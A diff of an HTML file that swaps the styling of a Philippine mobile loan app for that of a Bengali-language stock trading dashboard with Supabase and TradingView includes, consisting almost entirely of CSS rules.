@@ -1,1564 +1,2900 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="bn">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Fast & Safe Loans Philippines</title>
-<style>
-  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
-  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
-  :root{--yellow:#f0b90b;--yellow-dark:#d4a309;--yellow-light:#fff8e1;--bg:#fafafa;--card:#ffffff;--border:#e8e8e8;--text:#1a1a1a;--text2:#666;--text3:#999;--shadow:0 2px 16px rgba(0,0,0,0.08);--radius:16px;}
-  body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;justify-content:center;align-items:flex-start;}
-  #app{width:100%;max-width:480px;min-height:100vh;background:var(--bg);position:relative;overflow-x:hidden;}
-  .screen{display:none;min-height:100vh;flex-direction:column;}
-  .screen.active{display:flex;}
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>StockExchange India - ট্রেডিং প্ল্যাটফর্ম</title>
 
-  #toast{position:fixed;top:20px;left:50%;transform:translateX(-50%) translateY(-80px);background:#1a1a1a;color:#fff;padding:12px 24px;border-radius:50px;font-size:14px;font-weight:500;z-index:9999;transition:transform .4s cubic-bezier(.175,.885,.32,1.275);white-space:nowrap;pointer-events:none;}
-  #toast.show{transform:translateX(-50%) translateY(0);}
-  #toast.success{background:#00c853;}
-  #toast.error{background:#f44336;}
-  #toast.info{background:#1a1a1a;}
+    <!-- Supabase JS SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2">
+    </script>
 
-  .overlay{position:fixed;inset:0;background:rgba(0,0,0,.6);backdrop-filter:blur(8px);z-index:8000;display:none;flex-direction:column;align-items:center;justify-content:center;padding:24px;}
-  .overlay.active{display:flex;}
-  .overlay-card{background:#fff;border-radius:24px;padding:32px 24px;width:100%;max-width:340px;text-align:center;box-shadow:0 24px 64px rgba(0,0,0,.2);}
-  .overlay-card h3{font-size:20px;font-weight:700;margin-bottom:8px;color:var(--text);}
-  .overlay-card p{font-size:14px;color:var(--text2);margin-bottom:16px;line-height:1.6;}
+    <!-- TradingView Widget -->
+    <script type="text/javascript" src="https://s3.tradingview.com/tv.js">
+    </script>
 
-  .auth-wrap{flex:1;display:flex;flex-direction:column;justify-content:center;padding:32px 24px;}
-  .auth-logo{display:flex;align-items:center;gap:12px;margin-bottom:40px;}
-  .auth-logo .logo-icon{width:48px;height:48px;background:var(--yellow);border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:24px;font-weight:800;color:#1a1a1a;}
-  .auth-logo .logo-text{display:flex;flex-direction:column;}
-  .auth-logo .logo-text strong{font-size:18px;font-weight:800;color:var(--text);}
-  .auth-logo .logo-text span{font-size:12px;color:var(--text3);font-weight:400;}
-  .auth-title{font-size:26px;font-weight:800;margin-bottom:8px;}
-  .auth-sub{font-size:14px;color:var(--text2);margin-bottom:32px;}
-  .form-group{margin-bottom:16px;}
-  .form-group label{display:block;font-size:13px;font-weight:600;color:var(--text2);margin-bottom:6px;letter-spacing:.3px;}
-  .form-group input,.form-group select{width:100%;padding:14px 16px;border:1.5px solid var(--border);border-radius:12px;font-size:15px;font-family:inherit;background:#fff;color:var(--text);outline:none;transition:border-color .2s,box-shadow .2s;-webkit-appearance:none;}
-  .form-group input:focus,.form-group select:focus{border-color:var(--yellow);box-shadow:0 0 0 3px rgba(240,185,11,.12);}
-  .form-group .pw-wrap{position:relative;}
-  .form-group .pw-wrap input{padding-right:48px;}
-  .form-group .pw-toggle{position:absolute;right:14px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:var(--text3);font-size:18px;padding:4px;}
-  .btn-primary{width:100%;padding:16px;background:var(--yellow);color:#1a1a1a;border:none;border-radius:12px;font-size:16px;font-weight:700;cursor:pointer;transition:background .2s,transform .1s;margin-top:8px;font-family:inherit;}
-  .btn-primary:active{transform:scale(.98);background:var(--yellow-dark);}
-  .btn-primary:disabled{opacity:.6;cursor:not-allowed;}
-  .btn-secondary{width:100%;padding:16px;background:#fff;color:var(--text);border:2px solid var(--border);border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;transition:all .2s;margin-top:8px;font-family:inherit;}
-  .btn-secondary:active{transform:scale(.98);}
-  .auth-switch{text-align:center;margin-top:20px;font-size:14px;color:var(--text2);}
-  .auth-switch a{color:var(--yellow-dark);font-weight:600;cursor:pointer;text-decoration:none;}
-  .form-row{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
 
-  .dash-header{background:#fff;padding:16px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid var(--border);position:sticky;top:0;z-index:100;}
-  .dash-logo{display:flex;align-items:center;gap:10px;}
-  .dash-logo .logo-icon{width:36px;height:36px;background:var(--yellow);border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:800;color:#1a1a1a;}
-  .dash-logo strong{font-size:15px;font-weight:800;}
-  .btn-logout{background:none;border:1.5px solid var(--border);border-radius:8px;padding:7px 14px;font-size:13px;font-weight:600;cursor:pointer;color:var(--text2);font-family:inherit;transition:all .2s;}
-  .btn-logout:hover{border-color:#f44336;color:#f44336;}
+    <!-- Google Font -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet" />
 
-  .balance-card{background:linear-gradient(135deg,#1a1a1a 0%,#2d2d2d 100%);margin:20px;border-radius:20px;padding:24px;color:#fff;position:relative;overflow:hidden;}
-  .balance-card::before{content:'';position:absolute;top:-40px;right:-40px;width:160px;height:160px;background:rgba(240,185,11,.15);border-radius:50%;}
-  .balance-card::after{content:'';position:absolute;bottom:-60px;left:-20px;width:200px;height:200px;background:rgba(240,185,11,.08);border-radius:50%;}
-  .balance-label{font-size:12px;font-weight:500;color:rgba(255,255,255,.6);letter-spacing:.8px;text-transform:uppercase;margin-bottom:8px;}
-  .balance-amount{font-size:36px;font-weight:800;color:#fff;margin-bottom:4px;line-height:1.2;}
-  .balance-amount .currency{font-size:22px;font-weight:600;vertical-align:super;margin-right:2px;}
-  .balance-card-row{display:flex;align-items:center;justify-content:space-between;margin-top:16px;}
-  .status-badge{padding:5px 12px;border-radius:50px;font-size:11px;font-weight:700;letter-spacing:.5px;text-transform:uppercase;}
-  .badge-none{background:rgba(255,255,255,.15);color:rgba(255,255,255,.8);}
-  .badge-pending{background:rgba(255,165,0,.2);color:#ffb74d;}
-  .badge-approved{background:rgba(0,200,83,.2);color:#69f0ae;}
-  .badge-rejected{background:rgba(244,67,54,.2);color:#ef9a9a;}
-  .badge-waiting{background:rgba(255,165,0,.2);color:#ffb74d;}
-  .loan-type{font-size:12px;color:rgba(255,255,255,.5);font-weight:500;}
+    <style>
+        /* ===== ROOT VARIABLES ===== */
+        :root {
+            --bg-primary: #0b0e11;
+            --bg-secondary: #1e2329;
+            --bg-card: #181a20;
+            --bg-input: #2b3139;
+            --bg-hover: #2b3139;
+            --text-primary: #eaecef;
+            --text-secondary: #848e9c;
+            --text-muted: #5e6673;
+            --border-color: #2b3139;
+            --accent-green: #0ecb81;
+            --accent-red: #f6465d;
+            --accent-blue: #1e80ff;
+            --accent-yellow: #f0b90b;
+            --shadow: 0 2px 8px rgba(0, 0, 0, 0.4);
+            --radius: 8px;
+            --transition: all 0.25s ease;
+        }
 
-  .tab-bar{position:fixed;bottom:0;left:50%;transform:translateX(-50%);width:100%;max-width:480px;background:#fff;border-top:1px solid var(--border);display:flex;z-index:200;padding-bottom:env(safe-area-inset-bottom);}
-  .tab-item{flex:1;display:flex;flex-direction:column;align-items:center;padding:10px 4px 8px;cursor:pointer;transition:color .2s;border:none;background:none;font-family:inherit;color:var(--text3);}
-  .tab-item.active{color:var(--yellow-dark);}
-  .tab-item .tab-icon{font-size:22px;margin-bottom:3px;line-height:1;}
-  .tab-item .tab-label{font-size:10px;font-weight:600;letter-spacing:.3px;}
+        /* ===== RESET & BASE ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        html {
+            scroll-behavior: smooth;
+        }
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            overflow: hidden;
+        }
+        a {
+            text-decoration: none;
+            color: inherit;
+        }
+        button {
+            cursor: pointer;
+            font-family: inherit;
+            border: none;
+            outline: none;
+            background: none;
+            color: inherit;
+        }
+        input,
+        select {
+            font-family: inherit;
+            outline: none;
+            border: none;
+            background: var(--bg-input);
+            color: var(--text-primary);
+            padding: 10px 14px;
+            border-radius: var(--radius);
+            width: 100%;
+            font-size: 14px;
+            transition: var(--transition);
+        }
+        input:focus,
+        select:focus {
+            border-color: var(--accent-blue);
+            box-shadow: 0 0 0 2px rgba(30, 128, 255, 0.2);
+        }
+        input::placeholder {
+            color: var(--text-muted);
+        }
+        ::-webkit-scrollbar {
+            width: 4px;
+        }
+        ::-webkit-scrollbar-track {
+            background: var(--bg-primary);
+        }
+        ::-webkit-scrollbar-thumb {
+            background: var(--bg-input);
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--text-muted);
+        }
 
-  .tab-panel{display:none;padding:0 0 20px;}
-  .tab-panel.active{display:block;}
+        /* ===== SCROLLBAR ===== */
+        .scrollable::-webkit-scrollbar {
+            width: 4px;
+        }
+        .scrollable::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        .scrollable::-webkit-scrollbar-thumb {
+            background: var(--bg-input);
+            border-radius: 4px;
+        }
 
-  .section-card{background:#fff;margin:0 20px 16px;border-radius:var(--radius);padding:20px;box-shadow:var(--shadow);border:1px solid var(--border);}
-  .section-title{font-size:16px;font-weight:700;margin-bottom:16px;display:flex;align-items:center;gap:8px;}
-  .section-title .icon{font-size:18px;}
+        /* ===== UTILITY ===== */
+        .hidden {
+            display: none !important;
+        }
+        .flex {
+            display: flex;
+        }
+        .flex-col {
+            flex-direction: column;
+        }
+        .items-center {
+            align-items: center;
+        }
+        .justify-between {
+            justify-content: space-between;
+        }
+        .justify-center {
+            justify-content: center;
+        }
+        .gap-1 {
+            gap: 8px;
+        }
+        .gap-2 {
+            gap: 16px;
+        }
+        .gap-3 {
+            gap: 24px;
+        }
+        .flex-1 {
+            flex: 1;
+        }
+        .w-full {
+            width: 100%;
+        }
+        .text-center {
+            text-align: center;
+        }
+        .text-green {
+            color: var(--accent-green);
+        }
+        .text-red {
+            color: var(--accent-red);
+        }
+        .text-blue {
+            color: var(--accent-blue);
+        }
+        .text-yellow {
+            color: var(--accent-yellow);
+        }
+        .text-muted {
+            color: var(--text-secondary);
+        }
+        .text-sm {
+            font-size: 13px;
+        }
+        .text-xs {
+            font-size: 11px;
+        }
+        .font-bold {
+            font-weight: 700;
+        }
+        .font-semibold {
+            font-weight: 600;
+        }
+        .mt-1 {
+            margin-top: 8px;
+        }
+        .mt-2 {
+            margin-top: 16px;
+        }
+        .mb-1 {
+            margin-bottom: 8px;
+        }
+        .mb-2 {
+            margin-bottom: 16px;
+        }
+        .p-1 {
+            padding: 8px;
+        }
+        .p-2 {
+            padding: 16px;
+        }
+        .p-3 {
+            padding: 24px;
+        }
+        .rounded {
+            border-radius: var(--radius);
+        }
+        .bg-card {
+            background: var(--bg-card);
+        }
+        .bg-secondary {
+            background: var(--bg-secondary);
+        }
+        .border-bottom {
+            border-bottom: 1px solid var(--border-color);
+        }
 
-  .stat-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:0 20px 16px;}
-  .stat-card{background:#fff;border-radius:14px;padding:16px;box-shadow:var(--shadow);border:1px solid var(--border);}
-  .stat-card .s-label{font-size:11px;color:var(--text3);font-weight:600;letter-spacing:.4px;text-transform:uppercase;margin-bottom:6px;}
-  .stat-card .s-value{font-size:20px;font-weight:800;color:var(--text);}
-  .stat-card .s-value.yellow{color:var(--yellow-dark);}
+        /* ===== BUTTONS ===== */
+        .btn {
+            padding: 10px 20px;
+            border-radius: var(--radius);
+            font-weight: 600;
+            font-size: 14px;
+            transition: var(--transition);
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            border: none;
+        }
+        .btn-primary {
+            background: var(--accent-blue);
+            color: #fff;
+        }
+        .btn-primary:hover {
+            filter: brightness(1.1);
+        }
+        .btn-green {
+            background: var(--accent-green);
+            color: #fff;
+        }
+        .btn-green:hover {
+            filter: brightness(1.1);
+        }
+        .btn-red {
+            background: var(--accent-red);
+            color: #fff;
+        }
+        .btn-red:hover {
+            filter: brightness(1.1);
+        }
+        .btn-outline {
+            background: transparent;
+            border: 1px solid var(--border-color);
+            color: var(--text-primary);
+        }
+        .btn-outline:hover {
+            background: var(--bg-hover);
+        }
+        .btn-ghost {
+            background: transparent;
+            color: var(--text-secondary);
+        }
+        .btn-ghost:hover {
+            color: var(--text-primary);
+        }
+        .btn-sm {
+            padding: 6px 14px;
+            font-size: 12px;
+        }
+        .btn-block {
+            width: 100%;
+        }
+        .btn:disabled {
+            opacity: 0.5;
+            pointer-events: none;
+        }
 
-  .loan-form-wrap{padding:0 20px;}
-  .loan-form-wrap .form-group{margin-bottom:14px;}
-  .loan-form-wrap .form-group input,.loan-form-wrap .form-group select{padding:12px 14px;font-size:14px;}
+        /* ===== SIDEBAR ===== */
+        #sidebar {
+            width: 240px;
+            background: var(--bg-secondary);
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            border-right: 1px solid var(--border-color);
+            flex-shrink: 0;
+            position: sticky;
+            top: 0;
+            overflow-y: auto;
+            z-index: 50;
+        }
+        #sidebar .logo {
+            padding: 20px 20px 10px;
+            font-size: 20px;
+            font-weight: 800;
+            color: var(--accent-yellow);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 16px;
+        }
+        #sidebar .logo i {
+            font-size: 24px;
+        }
+        #sidebar .logo span {
+            color: var(--text-primary);
+        }
+        #sidebar .nav {
+            flex: 1;
+            padding: 12px 8px;
+        }
+        #sidebar .nav-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 10px 16px;
+            border-radius: var(--radius);
+            color: var(--text-secondary);
+            transition: var(--transition);
+            cursor: pointer;
+            margin-bottom: 2px;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        #sidebar .nav-item:hover {
+            background: var(--bg-hover);
+            color: var(--text-primary);
+        }
+        #sidebar .nav-item.active {
+            background: var(--bg-hover);
+            color: var(--accent-yellow);
+        }
+        #sidebar .nav-item i {
+            width: 20px;
+            text-align: center;
+            font-size: 16px;
+        }
+        #sidebar .nav-item .badge {
+            margin-left: auto;
+            background: var(--accent-red);
+            color: #fff;
+            font-size: 10px;
+            padding: 2px 8px;
+            border-radius: 12px;
+        }
+        #sidebar .user-info {
+            padding: 16px 20px;
+            border-top: 1px solid var(--border-color);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        #sidebar .user-info .avatar {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: var(--accent-blue);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 16px;
+            color: #fff;
+            flex-shrink: 0;
+        }
+        #sidebar .user-info .name {
+            font-weight: 600;
+            font-size: 14px;
+        }
+        #sidebar .user-info .phone {
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
+        #sidebar .user-info .logout-btn {
+            margin-left: auto;
+            color: var(--text-muted);
+            transition: var(--transition);
+            font-size: 16px;
+        }
+        #sidebar .user-info .logout-btn:hover {
+            color: var(--accent-red);
+        }
 
-  .bank-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-bottom:16px;}
-  .bank-card{background:#fff;border:2px solid var(--border);border-radius:12px;padding:12px 8px;display:flex;flex-direction:column;align-items:center;gap:6px;cursor:pointer;transition:all .2s;}
-  .bank-card:active{transform:scale(.96);}
-  .bank-card.selected{border-color:var(--yellow);background:var(--yellow-light);}
-  .bank-card .bank-icon{font-size:22px;}
-  .bank-card .bank-name{font-size:10px;font-weight:700;color:var(--text2);text-align:center;line-height:1.2;}
-  .bank-card.selected .bank-name{color:var(--yellow-dark);}
+        /* ===== MAIN CONTENT ===== */
+        #main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            overflow: hidden;
+            background: var(--bg-primary);
+        }
+        #main .topbar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 24px;
+            background: var(--bg-secondary);
+            border-bottom: 1px solid var(--border-color);
+            flex-shrink: 0;
+            min-height: 60px;
+        }
+        #main .topbar .page-title {
+            font-size: 18px;
+            font-weight: 700;
+        }
+        #main .topbar .topbar-right {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+        #main .topbar .topbar-right .balance-display {
+            background: var(--bg-card);
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-weight: 600;
+            font-size: 14px;
+            border: 1px solid var(--border-color);
+        }
+        #main .topbar .topbar-right .balance-display i {
+            margin-right: 6px;
+            color: var(--accent-yellow);
+        }
 
-  .profile-header{background:linear-gradient(135deg,var(--yellow) 0%,var(--yellow-dark) 100%);margin:20px;border-radius:20px;padding:24px;text-align:center;}
-  .profile-avatar{width:80px;height:80px;background:rgba(255,255,255,.25);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:36px;margin:0 auto 12px;border:3px solid rgba(255,255,255,.3);}
-  .profile-name{font-size:22px;font-weight:800;color:#1a1a1a;}
-  .profile-email{font-size:13px;color:rgba(26,26,26,.6);margin-top:4px;}
-  .profile-stats{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin:16px 20px 0;}
-  .profile-stat{background:#fff;border-radius:12px;padding:12px 8px;text-align:center;box-shadow:var(--shadow);border:1px solid var(--border);}
-  .profile-stat .ps-value{font-size:18px;font-weight:800;color:var(--text);}
-  .profile-stat .ps-label{font-size:10px;color:var(--text3);font-weight:600;text-transform:uppercase;letter-spacing:.3px;}
-  .profile-stat .ps-value.yellow{color:var(--yellow-dark);}
-  .profile-list{background:#fff;margin:16px 20px;border-radius:var(--radius);overflow:hidden;box-shadow:var(--shadow);border:1px solid var(--border);}
-  .profile-item{display:flex;align-items:center;justify-content:space-between;padding:14px 18px;border-bottom:1px solid var(--border);}
-  .profile-item:last-child{border-bottom:none;}
-  .profile-item .p-label{font-size:13px;color:var(--text3);font-weight:500;}
-  .profile-item .p-value{font-size:13px;font-weight:700;color:var(--text);}
-  .profile-item .p-value.yellow{color:var(--yellow-dark);}
-  .profile-actions{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:0 20px 16px;}
-  .profile-actions .action-btn{background:#fff;border:1.5px solid var(--border);border-radius:12px;padding:14px;text-align:center;font-size:12px;font-weight:600;color:var(--text2);cursor:pointer;transition:all .2s;font-family:inherit;}
-  .profile-actions .action-btn:active{transform:scale(.96);}
-  .profile-actions .action-btn.danger{border-color:#f44336;color:#f44336;}
-  .profile-actions .action-btn.primary{border-color:var(--yellow);color:var(--yellow-dark);}
+        #main .content {
+            flex: 1;
+            overflow-y: auto;
+            padding: 20px 24px;
+        }
 
-  .modal-backdrop{position:fixed;inset:0;background:rgba(0,0,0,.8);z-index:9000;display:none;align-items:center;justify-content:center;padding:20px;}
-  .modal-backdrop.active{display:flex;}
-  .modal-box{background:#fff;border-radius:20px;width:100%;max-width:360px;overflow:hidden;position:relative;}
-  .modal-head{padding:16px 20px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;}
-  .modal-head h4{font-size:16px;font-weight:700;}
-  .modal-close{background:none;border:none;font-size:24px;cursor:pointer;color:var(--text3);line-height:1;}
-  .modal-body{padding:0;}
-  .modal-body img{width:100%;display:block;}
+        /* ===== PAGE CONTAINERS ===== */
+        .page {
+            display: none;
+            animation: fadeIn 0.3s ease;
+        }
+        .page.active {
+            display: block;
+        }
+        @keyframes fadeIn {
+            0% {
+                opacity: 0;
+                transform: translateY(8px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
 
-  input[type=number]::-webkit-inner-spin-button,input[type=number]::-webkit-outer-spin-button{-webkit-appearance:none;margin:0;}
-  input[type=number]{-moz-appearance:textfield;}
-  select option{color:#1a1a1a;}
-  .verified-strip{background:#e8f5e9;border:1px solid #a5d6a7;border-radius:10px;padding:10px 14px;margin:0 20px 12px;font-size:13px;color:#2e7d32;font-weight:600;display:flex;align-items:center;gap:8px;}
-  .code-input{display:flex;gap:10px;justify-content:center;margin:16px 0;}
-  .code-input input{width:50px;height:56px;text-align:center;font-size:22px;font-weight:700;border:2px solid var(--border);border-radius:12px;outline:none;transition:border-color .2s;}
-  .code-input input:focus{border-color:var(--yellow);box-shadow:0 0 0 3px rgba(240,185,11,.12);}
+        /* ===== AUTH PAGES ===== */
+        #auth-page {
+            position: fixed;
+            inset: 0;
+            z-index: 1000;
+            background: var(--bg-primary);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        #auth-page .auth-box {
+            background: var(--bg-secondary);
+            padding: 40px 36px;
+            border-radius: 16px;
+            width: 100%;
+            max-width: 420px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.6);
+        }
+        #auth-page .auth-box .auth-logo {
+            text-align: center;
+            font-size: 28px;
+            font-weight: 800;
+            color: var(--accent-yellow);
+            margin-bottom: 8px;
+        }
+        #auth-page .auth-box .auth-logo span {
+            color: var(--text-primary);
+        }
+        #auth-page .auth-box .auth-sub {
+            text-align: center;
+            color: var(--text-secondary);
+            font-size: 14px;
+            margin-bottom: 24px;
+        }
+        #auth-page .auth-box .form-group {
+            margin-bottom: 16px;
+        }
+        #auth-page .auth-box .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 4px;
+            color: var(--text-secondary);
+        }
+        #auth-page .auth-box .form-group input {
+            background: var(--bg-input);
+            border: 1px solid var(--border-color);
+            padding: 12px 14px;
+        }
+        #auth-page .auth-box .form-group input:focus {
+            border-color: var(--accent-blue);
+        }
+        #auth-page .auth-box .auth-footer {
+            text-align: center;
+            margin-top: 16px;
+            font-size: 14px;
+            color: var(--text-secondary);
+        }
+        #auth-page .auth-box .auth-footer a {
+            color: var(--accent-blue);
+            font-weight: 600;
+            cursor: pointer;
+        }
+        #auth-page .auth-box .auth-footer a:hover {
+            text-decoration: underline;
+        }
+        #auth-page .auth-box .error-msg {
+            background: rgba(246, 70, 93, 0.15);
+            color: var(--accent-red);
+            padding: 10px 14px;
+            border-radius: var(--radius);
+            font-size: 13px;
+            margin-bottom: 12px;
+            display: none;
+        }
+        #auth-page .auth-box .success-msg {
+            background: rgba(14, 203, 129, 0.15);
+            color: var(--accent-green);
+            padding: 10px 14px;
+            border-radius: var(--radius);
+            font-size: 13px;
+            margin-bottom: 12px;
+            display: none;
+        }
 
-  .swipe-container{width:100%;padding:4px 0;margin:8px 0;}
-  .swipe-track{position:relative;width:100%;height:52px;background:#f0f0f0;border-radius:50px;overflow:hidden;cursor:pointer;user-select:none;touch-action:none;}
-  .swipe-track .swipe-bg{position:absolute;top:0;left:0;height:100%;background:linear-gradient(90deg,var(--yellow),var(--yellow-dark));border-radius:50px;transition:width .1s;width:0%;}
-  .swipe-track .swipe-text{position:absolute;top:0;left:0;width:100%;height:100%;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:700;color:var(--text);z-index:2;pointer-events:none;}
-  .swipe-track .swipe-thumb{position:absolute;top:4px;left:4px;width:44px;height:44px;background:#fff;border-radius:50%;box-shadow:0 2px 8px rgba(0,0,0,.2);z-index:3;display:flex;align-items:center;justify-content:center;font-size:20px;transition:left .05s;touch-action:none;cursor:grab;}
-  .swipe-track .swipe-thumb:active{cursor:grabbing;}
-  .swipe-track .swipe-thumb .arrow{font-size:22px;color:var(--yellow-dark);}
+        /* ===== DASHBOARD CARDS ===== */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+        .stat-card {
+            background: var(--bg-card);
+            padding: 18px 20px;
+            border-radius: var(--radius);
+            border: 1px solid var(--border-color);
+        }
+        .stat-card .stat-label {
+            font-size: 13px;
+            color: var(--text-secondary);
+            font-weight: 500;
+        }
+        .stat-card .stat-value {
+            font-size: 24px;
+            font-weight: 800;
+            margin-top: 4px;
+        }
+        .stat-card .stat-change {
+            font-size: 13px;
+            font-weight: 600;
+            margin-top: 4px;
+        }
 
-  .loan-code-display{background:#f5f5f5;border-radius:12px;padding:16px;margin:16px 0;}
-  .loan-code-display .code-label{font-size:12px;color:var(--text3);font-weight:600;text-transform:uppercase;letter-spacing:.5px;}
-  .loan-code-display .code-value{font-size:28px;font-weight:800;color:var(--text);letter-spacing:4px;margin-top:4px;}
-  .loan-code-display .code-value .highlight{color:var(--yellow-dark);}
+        /* ===== CHART ===== */
+        .chart-container {
+            background: var(--bg-card);
+            border-radius: var(--radius);
+            border: 1px solid var(--border-color);
+            padding: 12px;
+            margin-bottom: 24px;
+            height: 340px;
+        }
+        .chart-container #tradingview-widget {
+            width: 100%;
+            height: 100%;
+        }
 
-  .timer-display{font-size:42px;font-weight:800;color:var(--text);letter-spacing:2px;margin:8px 0;}
-  .timer-display .unit{font-size:14px;font-weight:600;color:var(--text3);}
+        /* ===== STOCKS TABLE ===== */
+        .stocks-table-wrap {
+            background: var(--bg-card);
+            border-radius: var(--radius);
+            border: 1px solid var(--border-color);
+            overflow: hidden;
+        }
+        .stocks-table-wrap .table-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 14px 20px;
+            border-bottom: 1px solid var(--border-color);
+        }
+        .stocks-table-wrap .table-header h3 {
+            font-size: 16px;
+            font-weight: 700;
+        }
+        .stocks-table-wrap .table-header .search-box {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: var(--bg-input);
+            padding: 4px 12px;
+            border-radius: 20px;
+            border: 1px solid var(--border-color);
+        }
+        .stocks-table-wrap .table-header .search-box input {
+            background: transparent;
+            padding: 6px 0;
+            font-size: 13px;
+            width: 160px;
+        }
+        .stocks-table-wrap .table-header .search-box input:focus {
+            box-shadow: none;
+        }
+        .stocks-table-wrap .table-header .search-box i {
+            color: var(--text-muted);
+        }
 
-  .info-text{font-size:12px;color:var(--text3);margin-top:4px;}
-</style>
+        .stocks-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 14px;
+        }
+        .stocks-table th {
+            text-align: left;
+            padding: 12px 16px;
+            color: var(--text-secondary);
+            font-weight: 600;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            border-bottom: 1px solid var(--border-color);
+            background: var(--bg-secondary);
+        }
+        .stocks-table td {
+            padding: 10px 16px;
+            border-bottom: 1px solid var(--border-color);
+            vertical-align: middle;
+        }
+        .stocks-table tr:hover td {
+            background: var(--bg-hover);
+        }
+        .stocks-table .stock-symbol {
+            font-weight: 700;
+        }
+        .stocks-table .stock-name {
+            color: var(--text-secondary);
+            font-size: 12px;
+        }
+        .stocks-table .trade-btns {
+            display: flex;
+            gap: 6px;
+        }
+        .stocks-table .trade-btns .btn {
+            padding: 4px 12px;
+            font-size: 11px;
+            font-weight: 600;
+        }
+
+        /* ===== BUY/SELL PANEL ===== */
+        .trade-panel {
+            background: var(--bg-card);
+            border-radius: var(--radius);
+            border: 1px solid var(--border-color);
+            padding: 20px;
+            margin-top: 16px;
+        }
+        .trade-panel .trade-tabs {
+            display: flex;
+            gap: 4px;
+            background: var(--bg-secondary);
+            border-radius: var(--radius);
+            padding: 4px;
+            margin-bottom: 16px;
+        }
+        .trade-panel .trade-tabs button {
+            flex: 1;
+            padding: 8px;
+            border-radius: 6px;
+            font-weight: 600;
+            font-size: 14px;
+            transition: var(--transition);
+            color: var(--text-secondary);
+        }
+        .trade-panel .trade-tabs button.active {
+            background: var(--accent-green);
+            color: #fff;
+        }
+        .trade-panel .trade-tabs button.active.sell-tab {
+            background: var(--accent-red);
+        }
+        .trade-panel .trade-tabs button:hover:not(.active) {
+            color: var(--text-primary);
+        }
+        .trade-panel .trade-form .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+        .trade-panel .trade-form .form-group {
+            margin-bottom: 12px;
+        }
+        .trade-panel .trade-form .form-group label {
+            font-size: 12px;
+            color: var(--text-secondary);
+            font-weight: 600;
+            display: block;
+            margin-bottom: 4px;
+        }
+        .trade-panel .trade-form .form-group input,
+        .trade-panel .trade-form .form-group select {
+            background: var(--bg-input);
+            border: 1px solid var(--border-color);
+        }
+        .trade-panel .trade-form .price-display {
+            font-size: 20px;
+            font-weight: 700;
+            text-align: center;
+            padding: 8px 0;
+        }
+
+        /* ===== WALLET ===== */
+        .wallet-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+        @media (max-width: 700px) {
+            .wallet-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+        .wallet-card {
+            background: var(--bg-card);
+            border-radius: var(--radius);
+            border: 1px solid var(--border-color);
+            padding: 20px;
+        }
+        .wallet-card h4 {
+            font-size: 16px;
+            margin-bottom: 12px;
+        }
+        .wallet-card .wallet-balance {
+            font-size: 28px;
+            font-weight: 800;
+            margin-bottom: 12px;
+        }
+
